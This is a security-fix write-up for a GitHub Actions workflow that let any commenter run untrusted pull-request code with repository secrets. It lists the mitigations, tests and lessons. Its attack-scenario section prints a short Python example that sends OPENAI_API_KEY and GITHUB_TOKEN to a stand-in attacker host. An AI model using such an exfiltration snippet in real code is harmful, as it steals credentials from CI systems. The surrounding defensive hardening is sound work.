# Security Fix: Codex AutoFix Workflow

## Vulnerability Summary

**Severity**: P0 (Critical)  
**Issue**: Slash command workflow runs untrusted PR code with secrets  
**Attack Vector**: Any user can trigger workflow via `/codex-autofix` comment and execute arbitrary code with repository secrets

## Original Vulnerability

The original implementation of the Codex AutoFix workflow (PR #19) had a critical security flaw:

### Vulnerable Behavior

1. **No Permission Gating**: Any user could trigger the workflow by commenting `/codex-autofix` on a PR
2. **Untrusted Code Execution**: Workflow checked out PR head (attacker-controlled fork)
3. **Malicious Dependencies**: Installed dependencies from PR's `requirements.txt`
4. **Secret Exposure**: Ran untrusted `tools/codex_autofix_runner.py` with:
   - `OPENAI_API_KEY` (OpenAI API access)
   - `GITHUB_TOKEN` (repository write access)

### Attack Scenarios

A malicious contributor could:

1. **Secret Exfiltration**: Modify `codex_autofix_runner.py` or `requirements.txt` to:
   ```python
   import os
   import requests
   requests.post("https://attacker.com/steal", json={
       "openai_key": os.environ["OPENAI_API_KEY"],
       "github_token": os.environ["GITHUB_TOKEN"]
   })
   ```

2. **Repository Compromise**: Use `GITHUB_TOKEN` to:
   - Push malicious code to protected branches
   - Modify workflow files
   - Create releases
   - Manage issues/PRs

3. **Supply Chain Attack**: Install malicious packages that persist in the CI environment

## Security Fix

### Implemented Mitigations

#### 1. Permission Validation
```yaml
- name: Check commenter permissions
  if: github.event_name == 'issue_comment'
  uses: actions/github-script@v7
  with:
    script: |
      const { data: permissionLevel } = await github.rest.repos.getCollaboratorPermissionLevel({
        owner: context.repo.owner,
        repo: context.repo.repo,
        username: context.actor,
      });
      const hasPermission = ['write', 'admin', 'maintain'].includes(permissionLevel.permission);
      if (!hasPermission) {
        core.setFailed(`User ${context.actor} does not have write access.`);
      }
```

**Effect**: Only repository collaborators with write access can trigger the workflow.

#### 2. Trusted Code Execution
```yaml
- name: Checkout base branch (trusted code)
  uses: actions/checkout@v5
  with:
    ref: ${{ steps.pr.outputs.base_ref }}  # Base branch, not PR head
```

**Effect**: Runner executes code from the repository's base branch, not from the PR.

#### 3. Dependency Isolation
```yaml
- name: Install trusted dependencies only
  run: |
    pip install openai requests
    # Install dependencies from BASE branch only (trusted code)
    if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
```

**Effect**: Only base branch dependencies are installed, not PR-contributed packages.

#### 4. Read-Only PR Analysis
```yaml
- name: Fetch PR changes for analysis (read-only)
  run: |
    git fetch origin pull/${{ steps.pr.outputs.number }}/head:pr-${{ steps.pr.outputs.number }}
    git diff ${{ steps.pr.outputs.base_sha }}..${{ steps.pr.outputs.head_sha }} > /tmp/pr.diff
```

**Effect**: PR changes are analyzed as a diff without executing untrusted code.

#### 5. Base Branch Verification
```yaml
- name: Verify base branch checkout (security check)
  run: |
    CURRENT_SHA=$(git rev-parse HEAD)
    if [ "$CURRENT_SHA" != "${{ steps.pr.outputs.base_sha }}" ]; then
      echo "ERROR: Not on base branch!"
      exit 1
    fi
```

**Effect**: Runtime verification that we're executing code from the base branch, preventing TOCTOU attacks.

#### 6. Updated Runner Arguments
```python
python tools/codex_autofix_runner.py \
  --repo "${{ github.repository }}" \
  --pr "${{ steps.pr.outputs.number }}" \
  --head-sha "${{ steps.pr.outputs.head_sha }}" \
  --base-sha "${{ steps.pr.outputs.base_sha }}" \
  --pr-diff "/tmp/pr.diff" \  # NEW: Diff file for analysis
  --command "$CODEX_AUTOFIX_COMMAND"
```

**Effect**: Runner receives PR context without needing to checkout untrusted code.

## Security Guarantees

After the fix:

✅ **No untrusted code execution with secrets**  
✅ **Permission-gated workflow trigger**  
✅ **Isolated from malicious dependencies**  
✅ **Secrets only accessible to trusted code**  
✅ **PR changes analyzed in read-only mode**  
✅ **Runtime verification of base branch checkout (TOCTOU protection)**

## Testing

To verify the security fix:

1. **Permission Check**: Create a PR from a fork without write access and try `/codex-autofix` → should fail
2. **Code Isolation**: Create a PR modifying `tools/codex_autofix_runner.py` to log secrets → secrets should not be logged
3. **Dependency Isolation**: Create a PR adding malicious package to `requirements.txt` → package should not be installed
4. **Functionality**: Trigger workflow as maintainer → should work correctly with base branch code

## References

- Original Issue: https://github.com/destroyer42/StableNew/pull/19#discussion_r2494246825
- GitHub Actions Security: https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
- Pwn Request Pattern: https://securitylab.github.com/research/github-actions-preventing-pwn-requests/

## Lessons Learned

1. **Never run untrusted code with secrets** - Always checkout base/trusted branch when secrets are needed
2. **Always validate permissions** - Don't rely on issue comments being from trusted users
3. **Isolate PR analysis** - Use diffs/APIs to analyze PRs without executing their code
4. **Minimize secret scope** - Only expose secrets to the minimal required code surface
5. **Review workflow triggers** - `issue_comment` and `pull_request_target` are high-risk events
